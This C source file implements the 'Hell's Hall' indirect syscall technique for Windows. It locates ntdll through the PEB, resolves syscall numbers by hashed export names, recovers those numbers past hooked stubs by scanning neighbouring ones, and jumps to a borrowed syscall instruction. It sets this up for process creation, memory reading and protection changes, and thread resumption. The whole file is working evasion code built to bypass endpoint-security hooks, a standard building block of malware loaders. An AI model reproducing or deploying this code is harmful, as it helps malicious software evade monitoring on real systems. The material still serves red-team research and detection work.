/*
 *  ~ hellshall.c ~
 * Functions for the Hell's Hall indirect syscalls implementation
 * Author: jakobfriedl
 */

#include "base.h"

BOOL InitNtdllConfigStructure(PNTDLL_CONFIG NtdllConf) {

    // getting peb 
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (!pPeb || pPeb->OSMajorVersion != 0xA)
        return FALSE;

    // getting ntdll.dll module (skipping our local image element)
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

    // getting ntdll's base address
    ULONG_PTR uModule = (ULONG_PTR)(pLdr->DllBase);
    if (!uModule)
        return FALSE;

    // fetching the dos header of ntdll
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)uModule;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    // fetching the nt headers of ntdll
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    // fetching the export directory of ntdll
    PIMAGE_EXPORT_DIRECTORY pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if (!pImgExpDir)
        return FALSE;

    // initalizing the NtdllConf structure's element
    NtdllConf->uModule = uModule;
    NtdllConf->dwNumberOfNames = pImgExpDir->NumberOfNames;
    NtdllConf->pdwArrayOfNames = (PDWORD)(uModule + pImgExpDir->AddressOfNames);
    NtdllConf->pdwArrayOfAddresses = (PDWORD)(uModule + pImgExpDir->AddressOfFunctions);
    NtdllConf->pwArrayOfOrdinals = (PWORD)(uModule + pImgExpDir->AddressOfNameOrdinals);

    // checking
    if (!NtdllConf->uModule || !NtdllConf->dwNumberOfNames || !NtdllConf->pdwArrayOfNames || !NtdllConf->pdwArrayOfAddresses || !NtdllConf->pwArrayOfOrdinals)
        return FALSE;
    else
        return TRUE;
}

#define UP     -32
#define DOWN    32
#define RANGE  0xFF

BOOL FetchNtSyscall(IN PNTDLL_CONFIG NtdllConf, IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {

    // initialize ntdll config if not found
    if (!NtdllConf->uModule) {
        if (!InitNtdllConfigStructure(NtdllConf))
            return FALSE;
    }

    if (dwSysHash != NULL)
        pNtSys->dwSyscallHash = dwSysHash;
    else
        return FALSE;

    for (size_t i = 0; i < NtdllConf->dwNumberOfNames; i++) {

        PCHAR pcFuncName = (PCHAR)(NtdllConf->uModule + NtdllConf->pdwArrayOfNames[i]);
        PVOID pFuncAddress = (PVOID)(NtdllConf->uModule + NtdllConf->pdwArrayOfAddresses[NtdllConf->pwArrayOfOrdinals[i]]);

        //\
        printf("- pcFuncName : %s - 0x%0.8X\n", pcFuncName, HASH(pcFuncName));

        pNtSys->pSyscallAddress = pFuncAddress;

        // if syscall found
        if (HASH(pcFuncName) == dwSysHash) {

            if (*((PBYTE)pFuncAddress) == 0x4C
                && *((PBYTE)pFuncAddress + 1) == 0x8B
                && *((PBYTE)pFuncAddress + 2) == 0xD1
                && *((PBYTE)pFuncAddress + 3) == 0xB8
                && *((PBYTE)pFuncAddress + 6) == 0x00
                && *((PBYTE)pFuncAddress + 7) == 0x00) {

                BYTE high = *((PBYTE)pFuncAddress + 5);
                BYTE low = *((PBYTE)pFuncAddress + 4);
                pNtSys->dwSSN = (high << 8) | low;
                break; // break for-loop [i]
            }

            // if hooked - scenario 1
            if (*((PBYTE)pFuncAddress) == 0xE9) {

                for (WORD idx = 1; idx <= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys->dwSSN = (high << 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys->dwSSN = (high << 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            // if hooked - scenario 2
            if (*((PBYTE)pFuncAddress + 3) == 0xE9) {

                for (WORD idx = 1; idx <= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys->dwSSN = (high << 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys->dwSSN = (high << 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            break; // break for-loop [i]

        }
    }

    // Code for indirect syscalls
    if (!pNtSys->pSyscallAddress)
        return FALSE;

    // looking somewhere random (0xFF byte away from the syscall address)
    ULONG_PTR uFuncAddress = (ULONG_PTR)pNtSys->pSyscallAddress + 0xFF;

    // getting the 'syscall' instruction of another syscall function
    for (DWORD z = 0, x = 1; z <= RANGE; z++, x++) {
        if (*((PBYTE)uFuncAddress + z) == 0x0F && *((PBYTE)uFuncAddress + x) == 0x05) {
            pNtSys->pSyscallInstAddress = ((ULONG_PTR)uFuncAddress + z);
            break; // break for-loop [x & z]
        }
    }

    if (pNtSys->dwSSN != NULL && pNtSys->pSyscallAddress != NULL && pNtSys->dwSyscallHash != NULL)
        return TRUE;
    else
        return FALSE;
}

BOOL InitializeNtSyscalls(PNTAPI_FUNC Nt) {
    
    NTDLL_CONFIG NtdllConf = { 0 }; 

    INFO("Initializing indirect syscalls...");

    if (!FetchNtSyscall(&NtdllConf, NtCreateUserProcess_crc32h  , &Nt->NtCreateUserProcess)) {
        PRINT_ERROR("FetchNtSyscall [NtCreateUserProcess]");
        return FALSE;
    }
    OKAY("[ 0x%p ] [ %0.2X ] NtCreateUserProcess", Nt->NtCreateUserProcess.pSyscallInstAddress, Nt->NtCreateUserProcess.dwSSN);

    if (!FetchNtSyscall(&NtdllConf, NtReadVirtualMemory_crc32h, &Nt->NtReadVirtualMemory)) {
        PRINT_ERROR("FetchNtSyscall [NtReadVirtualMemory]");
        return FALSE;
    }
    OKAY("[ 0x%p ] [ %0.2X ] NtReadVirtualMemory", Nt->NtReadVirtualMemory.pSyscallInstAddress, Nt->NtReadVirtualMemory.dwSSN);

    if (!FetchNtSyscall(&NtdllConf, NtProtectVirtualMemory_crc32h, &Nt->NtProtectVirtualMemory)) {
        PRINT_ERROR("FetchNtSyscall [NtProtectVirtualMemory]");
        return FALSE;
    }
    OKAY("[ 0x%p ] [ %0.2X ] NtProtectVirtualMemory", Nt->NtProtectVirtualMemory.pSyscallInstAddress, Nt->NtProtectVirtualMemory.dwSSN);

    if (!FetchNtSyscall(&NtdllConf, NtResumeThread_crc32h, &Nt->NtResumeThread)) {
        PRINT_ERROR("FetchNtSyscall [NtResumeThread]");
        return FALSE;
    }
    OKAY("[ 0x%p ] [ %0.2X ] NtResumeThread", Nt->NtResumeThread.pSyscallInstAddress, Nt->NtResumeThread.dwSSN);

    if (!FetchNtSyscall(&NtdllConf, NtTerminateProcess_crc32h, &Nt->NtTerminateProcess)) {
        PRINT_ERROR("FetchNtSyscall [NtTerminateProcess]");
        return FALSE;
    }
    OKAY("[ 0x%p ] [ %0.2X ] NtTerminateProcess", Nt->NtTerminateProcess.pSyscallInstAddress, Nt->NtTerminateProcess.dwSSN);

    if (!FetchNtSyscall(&NtdllConf, NtClose_crc32h, &Nt->NtClose)) {
        PRINT_ERROR("FetchNtSyscall [NtClose]");
        return FALSE;
    }
    OKAY("[ 0x%p ] [ %0.2X ] NtClose", Nt->NtClose.pSyscallInstAddress, Nt->NtClose.dwSSN);

    
    return TRUE;
}